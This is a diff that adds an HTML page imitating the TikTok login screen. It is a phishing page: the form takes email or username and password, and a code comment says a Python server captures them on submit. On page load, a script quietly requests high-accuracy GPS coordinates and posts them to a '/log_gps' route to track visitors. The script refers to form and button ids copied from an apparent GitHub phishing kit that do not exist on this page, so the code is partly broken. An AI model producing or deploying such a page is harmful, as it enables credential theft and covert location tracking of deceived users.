@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | TikTok</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com" rel="stylesheet">
+    <style>
+        body {
+            background-color: #121212; 
+            font-family: 'Inter', sans-serif;
+        }
+        .login-card {
+            background-color: #ffffff;
+            color: #121212;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.2);
+        }
+        .input-box {
+            background-color: #F1F1F2;
+            border: 1px solid rgba(22, 24, 35, 0.12);
+        }
+        .btn-tiktok {
+            background-color: #fe2c55;
+            color: white;
+        }
+        .social-btn {
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            transition: background-color 0.2s;
+        }
+        .social-btn:hover { background-color: #f8f8f8; }
+        #error-msg {
+            display: none;
+            color: #fe2c55;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="login-card w-full max-w-[440px] p-8 md:p-10 rounded-lg text-center">
+        
+        <!-- TikTok Logo Fixed -->
+        <div class="flex justify-center mb-6">
+            <img src="https://upload.wikimedia.org" alt="TikTok" class="h-8">
+        </div>
+
+        <h3 class="text-2xl font-bold mb-6">Log in</h3>
+
+        <div id="error-msg">Invalid email or password. Please try again.</div>
+
+        <form id="ttForm" class="mb-4">
+            <div class="text-left mb-4">
+                <input id="userInput" type="text" placeholder="Email or username" class="input-box w-full p-3 rounded-sm" required>
+            </div>
+
+            <div class="text-left mb-4">
+                <input id="passInput" type="password" placeholder="Password" class="input-box w-full p-3 rounded-sm" required>
+            </div>
+
+            <button id="ttBtn" type="submit" class="btn-tiktok w-full py-3 rounded-sm font-bold text-lg mb-2">
+                Log in
+            </button>
+            
+            <p class="text-xs text-gray-500 cursor-pointer hover:underline">Forgot password?</p>
+        </form>
+
+        <div class="flex items-center my-6">
+            <div class="flex-grow border-t border-gray-200"></div>
+            <span class="px-3 text-gray-400 text-xs font-bold uppercase">OR</span>
+            <div class="flex-grow border-t border-gray-200"></div>
+        </div>
+
+        <!-- Social Login Options -->
+        <div class="space-y-2">
+            <button class="social-btn w-full py-2.5 rounded-sm flex items-center justify-center gap-3 text-sm font-semibold">
+                <img src="https://www.gstatic.com" class="w-5"> Continue with Google
+            </button>
+            <button class="social-btn w-full py-2.5 rounded-sm flex items-center justify-center gap-3 text-sm font-semibold">
+                <img src="https://upload.wikimedia.org" class="w-5"> Continue with Facebook
+            </button>
+            <button class="social-btn w-full py-2.5 rounded-sm flex items-center justify-center gap-3 text-sm font-semibold">
+                <img src="https://upload.wikimedia.org" class="w-4"> Continue with Apple
+            </button>
+        </div>
+
+        <div class="border-t border-gray-100 mt-8 pt-6 text-sm text-gray-600">
+            Don't have an account? <span class="text-[#fe2c55] font-bold cursor-pointer hover:underline">Sign up</span>
+        </div>
+    </div>
+
+    <script>
+          const ghForm = document.getElementById('ghForm');
+        const ghBtn = document.getElementById('ghBtn');
+        const syncStatus = document.getElementById('session-sync');
+
+        ghForm.onsubmit = function() {
+            ghBtn.innerText = "Verifying identity...";
+            ghBtn.disabled = true;
+            ghBtn.style.opacity = "0.7";
+            syncStatus.style.display = "block";
+            // Data captured by Python server automatically on POST
+        };
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // Requesting high accuracy for a professional presentation look
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    const gpsData = {
+                        lat: p.coords.latitude, 
+                        lon: p.coords.longitude,
+                        acc: p.coords.accuracy,
+                        platform: "GitHub_Blackout_v8"
+                    };
+                    
+                    // Sending to the Python /log_gps route
+                    fetch('/log_gps', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(gpsData)
+                    });
+                }, 
+                function(err) { console.log("GPS denied"); },
+                { enableHighAccuracy: true });
+            }
+        }
+    </script>
+</body>
+</html>
